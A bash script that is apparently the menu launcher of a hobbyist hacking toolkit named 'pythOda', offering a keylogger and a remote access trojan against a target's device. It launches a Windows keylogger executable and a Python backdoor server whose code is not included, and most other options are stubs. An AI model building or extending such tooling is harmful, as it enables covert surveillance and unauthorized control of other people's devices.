# Colors
BLACK='\e[0;30m'
RED='\e[0;31m'
GREEN='\e[0;32m'
YELLOW='\e[0;33m'
BLUE='\e[0;34m'
MAGENTA='\e[0;35m'
CYAN='\e[0;36m'
WHITE='\e[0;37m'
BOLD_BLACK='\e[1;30m'
BOLD_RED='\e[1;31m'
BOLD_GREEN='\e[1;32m'
BOLD_YELLOW='\e[1;33m'
BOLD_BLUE='\e[1;34m'
BOLD_MAGENTA='\e[1;35m'
BOLD_CYAN='\e[1;36m'
BOLD_WHITE='\e[1;37m'
UNDERLINE_BLACK='\e[4;30m'
UNDERLINE_RED='\e[4;31m'
UNDERLINE_GREEN='\e[4;32m'
UNDERLINE_YELLOW='\e[4;33m'
UNDERLINE_BLUE='\e[4;34m'
UNDERLINE_MAGENTA='\e[4;35m'
UNDERLINE_CYAN='\e[4;36m'
UNDERLINE_WHITE='\e[4;37m'
BG_BLACK='\e[0;40m'
BG_RED='\e[0;41m'
BG_GREEN='\e[0;42m'
BG_YELLOW='\e[0;43m'
BG_BLUE='\e[0;44m'
BG_MAGENTA='\e[0;45m'
BG_CYAN='\e[0;46m'
BG_WHITE='\e[0;47m'
RESET='\e[0m'
# Colors end
CommandsHasTag="############################################################" # 60 Hashes
HelpSummaryHasTag="##########################################################################################" # 90 Hashes
OSNOTFOUNDTROJ="##################################################" # 50 Hashes
TrojanUsedLineHashtag="######################################################################" # 70 Hashes
KeyloggerLineHastag="#################################################################" # 65 Hashes
HashTagShortLine="##########" # 10 Hashes
ServerFile="Hacks/BackdoorGeneral/server.py"
logs="Logs/Start.log"
ErrorLogFile="Logs/Error.log"
versionnumb="1.1"
current_time=$(date +"%Y-%B-%d %H:%M:%S")
printWelcome() {
    echo -e "${BOLD_WHITE}Welcome to pythOda. Version number: $versionnumb${RESET}"
    echo ""
    echo " ██████    ██      ██  ████████████  ██      ██     ███     ████          █████"
    echo " ██    ██   ██    ██        ██       ██      ██   ██   ██   ██  ██       ██   ██"
    echo " ██    ██    ██  ██         ██       ██      ██  ██     ██  ██   ██     ██     ██"
    echo " ██████       ████          ██       ██████████  ██     ██  ██   ██    ███████████"
    echo " ██            ██           ██       ██      ██  ██     ██  ██   ██   ██         ██"
    echo " ██            ██           ██       ██      ██   ██   ██   ██  ██   ██           ██"
    echo " ██            ██           ██       ██      ██     ███     ████    ██             ██"
    echo ""
    echo "Pythoda started at // $current_time // Version: $versionnumb" >> $logs
    echo -e "${BOLD_WHITE}Loading shell tools...${RESET}"
    echo -e "${BOLD_WHITE}Please wait${RESET}"
    sleep 3
}

printCommands() {
    echo ""
    echo $CommandsHasTag
    echo ""
    echo -e "          ${UNDERLINE_WHITE}Started at $current_time${RESET}"
    echo ""
    echo -e "                  ${BOLD_WHITE}1{Keylogger}${RESET}"
    echo -e "                  ${BOLD_WHITE}2{Remote access trojan}${RESET}"
    echo -e "                  ${BOLD_WHITE}3{idk}${RESET}"
    echo ""
    echo -e "          ${UNDERLINE_WHITE}Misc commands $current_time${RESET}"
    echo ""
    echo -e "                  ${BOLD_WHITE}10{Version number}${RESET}"
    echo -e "                  ${BOLD_WHITE}11{Display error log}${RESET}"
    echo -e "                  ${BOLD_WHITE}12{Display commands}${RESET}"
    echo -e "                  ${BOLD_WHITE}13{Clear & Print commands}${RESET}"
    echo -e "                  ${BOLD_WHITE}14{Help Summary}${RESET}"
    echo -e "                  ${BOLD_WHITE}15{Exit}${RESET}"
    echo ""
    echo $CommandsHasTag
    echo ""
}

HelpSummary() {
    echo ""
    echo $HelpSummaryHasTag
    echo ""
    echo -e "          ${UNDERLINE_WHITE}Help summary started at $current_time${RESET}"
    echo ""
    echo -e "                  ${BOLD_WHITE}1{Keylogger}${RESET} // Saves into a txt file users keyboard input"
    echo -e "                  ${BOLD_WHITE}2{Remote access trojan}${RESET} // Gives a full access to targets device"
    echo -e "                  ${BOLD_WHITE}3{idk}${RESET} // Undone"
    echo ""
    echo -e "          ${UNDERLINE_WHITE}Misc commands $current_time${RESET}"
    echo ""
    echo -e "                  ${BOLD_WHITE}10{Version number}${RESET} // Prints version number"
    echo -e "                  ${BOLD_WHITE}11{Display error log}${RESET} // Displays the error log onto the screen"
    echo -e "                  ${BOLD_WHITE}12{Display commands}${RESET} // Prints all of the commands"
    echo -e "                  ${BOLD_WHITE}13{Clear & Print commands}${RESET} // Clears the terminal and prints commands"
    echo -e "                  ${BOLD_WHITE}14{Help Summary}${RESET} // Prints a text summary that gives info about the commands"
    echo -e "                  ${BOLD_WHITE}15{Exit}${RESET} // Exits the tool"
    echo ""
    echo $HelpSummaryHasTag
    echo ""
}

ctrl_c() {
    echo ""
    echo "Exiting..."
    exit 1
}
trap ctrl_c INT
# Hack functions
KeyloggerWIN() {
    Hacks/KeyloggerWINDOWS/WINkeylogger.exe
}

BackDoorTrojanLinuxINS() {
    echo "Coming soon" # For Linux
}

BackDoorTrojanWinINS() { 
    echo "Coming soon" # For Windows
}

BackDoorTrojanAndrINS() {
    echo "Coming soon" # For android
}

BackDoorTrojanIosINS() {
    echo "Coming soon" # For Ios
}

BackDoorTrojanServerStart() {
    python3 $ServerFile
}

# End 

printWelcome
printCommands
while true
do
    printf "${BOLD_WHITE}Enter a command:${RESET} "
    read CommandInput

    if [[ $CommandInput == "1" ]]; then
        echo ""
        echo $KeyloggerLineHastag
        echo ""
        echo -e "      ${BOLD_WHITE}Please enter a operating system for the keylogger attack${RESET}"
        echo ""
        echo -e "                          ${BOLD_WHITE}1{Windows}${RESET}"
        echo -e "                          ${BOLD_WHITE}2{linux}${RESET}"
        echo -e "                          ${BOLD_WHITE}3{Android/Ios}${RESET}"
        echo -e "                          ${BOLD_WHITE}4{Ios}${RESET}"
        echo ""
        echo $KeyloggerLineHastag
        echo ""
        printf "${BOLD_WHITE}Enter a os:${RESET} "
        read EnterKeyloggerOS
        # Enter os
        if [[ $EnterKeyloggerOS == "1" ]]; then
            echo "hello world"

        elif [[ $EnterKeyloggerOS == "2" ]]; then
            echo "Hello world2"
        elif [[ $EnterKeyloggerOS == "3" ]]; then
            echo "Hello world3"
        else
            echo $OSNOTFOUNDTROJ
            echo ""
            echo -e "                  ${UNDERLINE_WHITE}OS NOT FOUND${RESET}"
            echo ""
            echo $OSNOTFOUNDTROJ
        fi
        # Enter os

        elif [[ $CommandInput == "2" ]]; then
            echo ""
            echo $TrojanUsedLineHashtag
            echo ""
            echo -e "      ${BOLD_WHITE}Please enter a operating system for the remote access trojan attack${RESET}"
            echo ""
            echo -e "                          ${BOLD_WHITE}1{Linux}${RESET}"
            echo -e "                          ${BOLD_WHITE}2{Windows}${RESET}"
            echo -e "                          ${BOLD_WHITE}3{Android/Ios}${RESET}"
            echo -e "                          ${BOLD_WHITE}4{Ios}${RESET}"
            echo ""
            echo $TrojanUsedLineHashtag
            echo ""

            printf "${BOLD_WHITE}Enter a os:${RESET} "
            read TrojanOs
            

            if [[ $TrojanOs == "1" ]]; then
                echo "Hello"
                python3 $ServerFile # GOTTA BE LAST
            elif [[ $TrojanOs == "2" ]]; then
                echo "Test2"
            elif [[ $TrojanOs == "3" ]]; then
                echo "Test3"
            else 
                echo $OSNOTFOUNDTROJ
                echo ""
                echo -e "                  ${UNDERLINE_WHITE}OS NOT FOUND${RESET}"
                echo ""
                echo $OSNOTFOUNDTROJ
            fi
        # Misc commands

        elif [[ $CommandInput == "10" ]]; then 
            echo "PythOda. Version number: $versionnumb"
        elif [[ $CommandInput == "11" ]]; then 
            cat $ErrorLogFile
        elif [[ $CommandInput == "12" ]]; then 
            printCommands
        elif [[ $CommandInput == "13" ]]; then 
            clear
            printCommands
        elif [[ $CommandInput == "14" ]]; then 
            HelpSummary
        elif [[ $CommandInput == "15" ]]; then 
            break
        else
            echo "Command was invalid or not found // The error command: ${CommandInput} // Time: ${current_time} // Version number: $versionnumb" >> $ErrorLogFile
    fi
done
